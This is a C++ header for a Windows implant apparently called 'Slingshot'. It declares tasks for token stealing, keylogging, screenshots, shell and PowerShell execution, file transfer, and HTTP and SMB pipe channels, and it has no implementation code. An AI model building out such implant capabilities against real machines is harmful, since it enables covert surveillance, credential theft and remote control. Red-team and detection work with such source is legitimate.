#pragma once

#include <Windows.h>
#include <string>

#include "Config.h"

enum TaskCode {
	Task_Exit,
	Task_TargetInfo,
	Task_Idletime,
	Task_GetPID,
	Task_GetUID,
	Task_Logon,
	Task_GetPrivs,
	Task_Shell,
	Task_TCPConnect,
	Task_Tasklist,
	Task_StealToken,
	Task_Dir,
	Task_ScreenShot,
	Task_UploadFile,
	Task_DownloadFile,
	Task_RemoveFile,
	Task_Keylogger,
	Task_Powershell,
	Task_StagePowershell
};

enum ReturnCode {
	Success,
	Failure,
	FunctionalityNotImplemented
};

typedef struct HTTPState
{
	HANDLE hConnection;
	BOOL useSSL;
} HTTPState;

typedef struct HostInformation
{
	LPSTR architecture;
	char windowsVersion[8];
	char computerName[256];
} HostInformation;

typedef struct TaskingState
{
	std::string domain;
	std::string username;
	std::string password;
	BOOLEAN impersonating;
	BOOLEAN netonly;
	HANDLE hToken;
	std::string shellOutput;
	std::string poshScript;
	HANDLE poshHandle;
} TaskingState;

typedef struct SMBState
{
	HANDLE hInboundPipe;
	HANDLE hOutboundPipe;
} SMBState;

typedef struct State
{
	char targetID[11];
	BOOL running;

	HTTPState httpState;
	SMBState smbState;
	TaskingState taskingState;
	HostInformation hostInfo;
} State;


typedef struct TaskingData
{
	TaskCode taskCode;
	DWORD taskID;
	std::string argument1;
	std::string argument2;
} TaskingData;

typedef struct ResponseData
{
	DWORD taskID;
	DWORD returnCode = Failure;
	std::string rawData;
	std::string extraOutput; // Reserved for relaying delayed output
} ResponseData;

DWORD StartSlingshot();

static const char alphanum[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

void GetSystemInfoString(State & state);
std::string GetTargetInfo(State & state);
